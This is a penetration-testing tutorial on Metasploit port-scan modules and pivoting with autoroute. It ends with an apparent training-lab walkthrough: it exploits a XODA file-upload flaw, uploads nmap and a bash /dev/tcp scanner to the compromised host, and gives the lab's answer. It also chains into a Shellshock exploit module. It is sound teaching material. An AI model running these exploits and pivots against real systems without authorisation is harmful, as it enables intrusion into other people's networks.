# Port Scanning with Metasploit Auxiliary Modules — A Practical Guide

This document explains what auxiliary modules are, when to use Metasploit's scanning capabilities versus external tools (like Nmap), and shows step-by-step workflows (including pivoting using autoroute). It includes commands, expected outputs, and practical tips.

## What is an auxiliary module?

Auxiliary modules are non-exploit modules in Metasploit used for information gathering, scanning, fuzzing, and other tasks that don't necessarily deliver a payload. Examples include port scanners, service enumerators, and credential brute-forcers.

## Why use Metasploit auxiliary modules instead of/alongside Nmap?

- Nmap is the go-to for fast, flexible external scans and has many NSE scripts.
- Metasploit auxiliary modules are useful when you already have an active session inside a target network and want to scan other hosts from that vantage point (pivoting).
- Auxiliary modules integrate directly with the Metasploit database and workspaces. Results are stored and available to subsequent modules (exploits, post modules).

Example: you have a Meterpreter session on Host-A (inside the target LAN). Running a Metasploit TCP scanner via that session lets you discover Host-B's services without sending traffic from your external machine.

## Common portscan auxiliary modules

- `scanner/portscan/tcp` — TCP port scanner (fast sweep)
- `scanner/portscan/tcp_syn` — SYN-style scan (may require root)
- `scanner/portscan/ack` — ACK scan to map firewall rules
- `scanner/portscan/udp` — UDP port scanning
- `scanner/discovery/arp_sweep` — ARP-based discovery on local networks

## Step-by-step demo: scan with an auxiliary TCP scanner

1) Start Postgres and open msfconsole

```bash
sudo service postgresql start
msfconsole

msf6 > db_status
[*] postgresql connected to msf
```

2) Create/select a workspace

```
msf6 > workspace -a ports_scan
[+] Added workspace: ports_scan
msf6 > workspace
Workspace: ports_scan
```

3) Find and use a portscan module

```
msf6 > search scanner/portscan
msf6 > use scanner/portscan/tcp
```

4) Configure options (RHOSTS, PORTS, THREADS, TIMEOUT)

```
msf6 auxiliary(scanner/portscan/tcp) > show options
Module options (auxiliary/scanner/portscan/tcp):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   192.168.1.0/24   yes       The target address range or CIDR
   PORTS    1-65535          yes       Ports to scan
   THREADS  10               no        The number of concurrent threads

msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 1-1000
msf6 auxiliary(scanner/portscan/tcp) > set THREADS 50
```

5) Run the scan

```
msf6 auxiliary(scanner/portscan/tcp) > run
[+] 192.168.1.5:22 - Open
[+] 192.168.1.10:80 - Open
[+] 192.168.1.10:135 - Open
[*] Scans complete
```

6) Inspect results (hosts/services stored in DB)

```
msf6 > hosts
msf6 > services
```

7) Follow-up: check an HTTP service

```
msf6 > use auxiliary/scanner/http/http_version
msf6 auxiliary(http_version) > set RHOSTS 192.168.1.10
msf6 auxiliary(http_version) > run
```

If you prefer a simple quick view, you can also use `curl http://<ip>` on your attack machine (if reachable) to inspect web content.

## Pivoting (post-exploitation) — autoroute example

1) Obtain a Meterpreter session on an internal host (session ID 1):

```
msf6 > sessions -i 1
meterpreter > sysinfo
meterpreter > background
```

2) Run autoroute to add routes for the target subnet

```
msf6 > run post/multi/manage/autoroute RHOSTS=10.10.10.0/24 SESSION=1
[+] Added route to 10.10.10.0/24 via session 1
```

3) Now run scanners against the routed subnet — traffic will go via the session

```
msf6 > use scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.10.10.0/24
msf6 auxiliary(scanner/portscan/tcp) > run
```

Notes:
- Autoroute sets up Metasploit routes so modules send traffic through the session. It is an internal routing mechanism inside msfconsole.
- Ensure the session has sufficient privileges/networking functionality to forward traffic.

## UDP scanning

UDP scans with Metasploit are slower and may miss responses. Use targeted UDP port lists (DNS 53, NTP 123, SNMP 161, etc.).

```
msf6 > use scanner/portscan/udp
msf6 auxiliary(scanner/portscan/udp) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/portscan/udp) > set PORTS 53,123,161,514
msf6 auxiliary(scanner/portscan/udp) > run
```

## Chaining to vulnerability checks and exploitation

After discovering services:

- Search for exploits: `search name:<service>` (e.g., `search name:tomcat`)
- Load exploit module, `show options`, `set RHOST`, `set RPORT`, `check`, and `exploit`.

Example:

```
msf6 > search name:apache
msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf6 exploit(apache_mod_cgi_bash_env_exec) > set RHOST 192.168.1.10
msf6 exploit(apache_mod_cgi_bash_env_exec) > check
msf6 exploit(apache_mod_cgi_bash_env_exec) > exploit
```

## Best practices

- Respect rules-of-engagement. Internal scans and pivoting can impact production systems.
- Use dedicated workspaces per engagement.
- Start with conservative thread counts and scan small port ranges first.
- Prefer Nmap for heavy external scanning; use Metasploit when scanning from an internal pivot or when you want DB integration.

## Short checklist

- [ ] Start PostgreSQL and msfconsole
- [ ] Create/select workspace
- [ ] Choose appropriate scanner module
- [ ] Set RHOSTS, PORTS, THREADS
- [ ] Run scan and inspect `hosts`/`services`
- [ ] Chain to service-specific auxiliary/exploit modules
- [ ] If pivoting, add routes with autoroute and re-scan via session

---
Revision: Detailed, user-friendly guide for port scanning with Metasploit auxiliary modules.

## Example: T1046 — Network Service Scanning (Lab walkthrough)

This walkthrough reproduces a practical lab that demonstrates discovery and scanning techniques (Nmap and Metasploit auxiliary modules) and shows how to pivot from a compromised host to scan an internal network.

Overview: identify reachable hosts, perform Nmap scanning, exploit a webapp to obtain a Meterpreter session, pivot with autoroute, and scan an internal host using both Metasploit and a simple bash port scanner.

Steps (condensed from the lab):

1. Open the Kali lab machine and verify reachability of the target:

```
ping -c 4 demo1.ine.local
```

2. Run a default Nmap scan to discover open ports:

```
nmap demo1.ine.local
```

The default scan reveals an open port 80 (HTTP).

3. Check the HTTP content hosted on port 80:

```
curl demo1.ine.local
```

The application is a XODA web app instance which has a Metasploit module available: exploit/unix/webapp/xoda_file_upload

4. Start Metasploit and use the XODA file upload exploit:

```
msfconsole
use exploit/unix/webapp/xoda_file_upload
set RHOSTS demo1.ine.local
set TARGETURI /
set LHOST 192.63.4.2
exploit
```

A meterpreter session should be spawned on the target.

5. From meterpreter, open a command shell and identify network details to find the internal network and the second target's IP:

```
meterpreter > shell
ip addr
```

In the lab the compromised host's internal interface shows 192.180.108.2; the second target is at 192.180.108.3.

6. Add a route in Metasploit so scans go through the session (autoroute):

```
run autoroute -s 192.180.108.2
```

7. Background the meterpreter session (CTRL+Z, confirm with y) and use Metasploit's TCP portscan auxiliary module to scan the second host:

```
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.180.108.3
set verbose false
set ports 1-1000
exploit
```

8. Inspect the available static binaries on the compromised host (useful for uploading nmap if the target is air-gapped):

```
ls -al /root/static-binaries/nmap
file /root/static-binaries/nmap
```

9. Background the Metasploit session again and create a simple bash port-scanning script (first 1000 ports) on your attack machine. Example script (save as `bash-port-scanner.sh`):

```
#!/bin/bash
for port in {1..1000}; do
   timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
done
```

10. Foreground msfconsole, reattach to the meterpreter session (`sessions -i <id>`), and upload both the static `nmap` binary and the bash script to the compromised host:

```
sessions -i 1
upload /root/static-binaries/nmap /tmp/nmap
upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
```

11. Make the uploaded files executable and run the bash port scanner against the internal host:

```
meterpreter > shell
cd /tmp
chmod +x ./nmap ./bash-port-scanner.sh
./bash-port-scanner.sh 192.180.108.3
```

The scan reveals open ports 21 (FTP), 22 (SSH) and 80 (HTTP).

12. (Optional) Use the uploaded static nmap binary for a full port scan:

```
./nmap -p- 192.180.108.3
```

Conclusion: The internal host runs FTP, SSH and HTTP services (three services total).

References:
- https://attack.mitre.org/techniques/T1046/

Lab question (from the original lab): How many services are running on the second target machine?

Your answer: 3
